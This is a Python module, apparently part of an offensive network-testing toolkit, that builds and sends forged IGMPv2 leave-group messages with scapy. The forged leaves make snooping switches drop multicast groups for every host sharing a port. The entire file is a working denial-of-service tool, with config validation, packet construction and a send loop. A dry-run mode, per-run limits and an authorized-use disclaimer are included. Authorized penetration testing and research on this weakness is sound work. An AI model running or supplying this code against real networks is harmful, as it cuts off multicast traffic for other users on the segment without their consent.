"""IGMP leave spoofing: send IGMPv2 leave-group messages for groups the sender did not join.

A host that stops listening to a group sends an IGMP leave message to the all-routers
address (224.0.0.2). A snooping switch that receives a leave removes the port from the
group, after it checks for other members. The leave is not authenticated: the switch does
not check that the sender ever joined the group, or that it is the only host behind the port.

On a port shared by several hosts, such as a segment behind a hub or an unmanaged switch,
one host's leave removes the group from that port for all of them. This module sends such
leaves, once per group and count, from the operator's MAC and address.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import IGMP, IP, Ether, sendp
from scapy.layers.inet import IPOption_Router_Alert
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.igmp_spoofing import MAX_GROUPS, group_mac, validate_group

MAX_LEAVES = 100                    # leaves per group
IGMP_V2_LEAVE = 0x17
ALL_ROUTERS = "224.0.0.2"


@dataclass(frozen=True)
class IgmpLeaveSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the switch
    source_mac: str                     # the sender's MAC (required)
    groups: tuple[str, ...]             # groups to leave, IPv4 addresses
    source_ip: str = "0.0.0.0"          # the sender's IP; 0.0.0.0 for an unnumbered host
    leaves: int = 1                     # leave messages per group
    dry_run: bool = False               # build leaves but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        try:
            ipaddress.IPv4Address(self.source_ip)
        except ValueError as exc:
            raise ValueError("Source address must be an IPv4 address (or 0.0.0.0).") from exc
        if not self.groups:
            raise ValueError("At least one multicast group is required.")
        if len(self.groups) > MAX_GROUPS:
            raise ValueError(f"At most {MAX_GROUPS} groups per run.")
        for group in self.groups:
            validate_group(group)
        if not 1 <= self.leaves <= MAX_LEAVES:
            raise ValueError(f"Leaves per group must be between 1 and {MAX_LEAVES}.")


@dataclass
class IgmpLeaveSpoofingStats:
    leaves: int = 0
    status: str = ""


def build_leave(source_mac: str, source_ip: str, group: str) -> Packet:
    """IGMPv2 leave-group message for one group, sent to the all-routers address."""
    return (
        Ether(src=normalize_unicast_mac(source_mac), dst=group_mac(ALL_ROUTERS))
        / IP(src=source_ip, dst=ALL_ROUTERS, ttl=1, proto=2, options=[IPOption_Router_Alert()])
        / IGMP(type=IGMP_V2_LEAVE, mrcode=0, gaddr=group)
    )


def run_igmp_leave_spoofing(
    config: IgmpLeaveSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[IgmpLeaveSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> IgmpLeaveSpoofingStats:
    """Send the leave messages, `leaves` per group, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        total = len(config.groups) * config.leaves
        stats = IgmpLeaveSpoofingStats(
            status=f"Dry run: would send {total} IGMP leave message(s) for {len(config.groups)} group(s). Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    stats = IgmpLeaveSpoofingStats()
    for group in config.groups:
        for _ in range(config.leaves):
            if stop_event.is_set():
                return stats
            send(build_leave(config.source_mac, config.source_ip, group), iface=config.iface, verbose=False)
            stats.leaves += 1
            on_progress(replace(stats))
    return stats
